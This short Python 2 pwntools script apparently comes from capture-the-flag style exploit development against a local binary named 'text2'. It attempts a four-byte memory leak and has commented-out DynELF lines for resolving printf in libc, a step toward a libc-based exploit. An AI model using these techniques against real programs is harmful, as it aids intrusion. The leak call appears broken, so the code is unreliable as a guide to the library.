from pwn import *

r = process("./text2")
addr = 0x08048009
leak = r.leak(addr,4)
print "leak: " + leak

# d = DynELF(leak, 0x8048640)
# printf_addr = d.lookup('printf', 'libc')

# log.success("printf_addr: "+hex(printf_addr))